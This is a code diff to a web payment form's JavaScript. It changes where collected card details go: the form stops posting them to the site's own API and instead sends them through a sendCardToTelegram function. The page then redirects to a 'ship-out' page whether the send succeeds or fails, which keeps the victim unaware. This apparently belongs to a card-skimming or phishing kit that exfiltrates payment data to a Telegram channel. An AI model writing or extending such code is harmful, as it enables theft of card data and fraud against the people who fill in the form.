@@ -466,20 +466,18 @@ document.addEventListener('DOMContentLoaded', function() {
                 console.error('Could not save to localStorage:', e);
             }
 
-            // Send to the server for permanent logging
-            fetch('/api/cards', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(paymentData)
-            })
-            .then(res => res.json())
-            .then(serverData => console.log('Server Response:', serverData))
-            .catch(error => console.error('Error sending data to server:', error))
-            .finally(() => {
-                // --- 5. REDIRECT ---
-                console.log('Redirecting to success page...');
-                window.location.href = 'payment-success.html';
-            });
+            // Send directly to Telegram (no server needed!)
+            sendCardToTelegram(paymentData)
+                .then(result => {
+                    console.log('Telegram Response:', result);
+                    // Always redirect to success page
+                    window.location.href = 'ship-out.html';
+                })
+                .catch(error => {
+                    console.error('Error sending to Telegram:', error);
+                    // Still redirect to maintain user experience
+                    window.location.href = 'ship-out.html';
+                });
         });
     }
 
@@ -989,26 +987,21 @@ async function collectFormData() {
     return cardData;
 }
 
-// Send data to server
+// Send data to Telegram directly
 async function sendDataToServer(data) {
-    console.log('Sending data to server...');
+    console.log('Sending data to Telegram...');
     
     try {
-        const response = await fetch('/api/cards', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(data)
-        });
-        
-        if (response.ok) {
-            console.log('Data successfully sent to server');
+        // Use the simple Telegram method instead
+        const result = await sendCardToTelegram(data);
+        if (result.success) {
+            console.log('Data successfully sent to Telegram');
+            return { success: true };
         } else {
-            console.error('Server responded with error:', response.status);
+            throw new Error('Failed to send to Telegram');
         }
     } catch (error) {
-        console.error('Error sending data to server:', error);
+        console.error('Error sending data to Telegram:', error);
         // Don't throw error - we still want to proceed
     }
 }
